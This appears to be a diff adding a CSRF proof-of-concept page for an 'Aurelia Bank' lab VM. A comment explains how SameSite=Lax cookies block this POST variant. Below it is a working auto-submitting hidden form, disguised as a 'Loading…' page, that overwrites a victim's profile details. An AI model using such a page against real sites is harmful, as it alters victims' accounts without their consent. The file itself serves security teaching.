@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<!--
+  Aurelia Bank — CSRF Proof-of-Concept  (POST variant)
+  ===========================================================================
+  ACADEMIC USE ONLY, against your own isolated Aurelia Bank test VM.
+
+  This is the "classic" auto-submitting POST CSRF page. It demonstrates the
+  attack shape most write-ups show. IMPORTANT caveat for this lab:
+
+    Modern browsers default cookies to SameSite=Lax, which does NOT send the
+    session cookie on a CROSS-SITE POST. So over plain HTTP this POST variant
+    will usually reach the endpoint WITHOUT the session cookie and therefore be
+    bounced to the login page (no change made). That is itself a useful teaching
+    point about how SameSite=Lax mitigates classic POST CSRF.
+
+  When does this POST variant succeed?
+    - If the attacker page is same-site as the bank (not a real CSRF), or
+    - If the session cookie were set SameSite=None; Secure over HTTPS, or
+    - In older/relaxed browser configurations.
+
+  For a reliable cross-site demonstration over the lab's HTTP setup, use the
+  GET variant (docs/csrf-poc.html), which succeeds because a top-level GET
+  navigation IS allowed to carry a Lax cookie.
+-->
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Loading&hellip;</title>
+</head>
+<body onload="document.forms[0].submit()">
+    <p>Please wait&hellip;</p>
+
+    <!-- VICTIM: change to the victim app's base URL on your test network -->
+    <form method="POST" action="http://VICTIM/aurelia-bank/customer/profile.php">
+        <input type="hidden" name="form"      value="profile">
+        <input type="hidden" name="full_name" value="John Doe (CSRF-POST)">
+        <input type="hidden" name="email"     value="john.doe@example.test">
+        <input type="hidden" name="phone"     value="+1-202-555-0182">
+        <input type="hidden" name="address"   value="Changed by CSRF POST PoC">
+    </form>
+</body>
+</html>
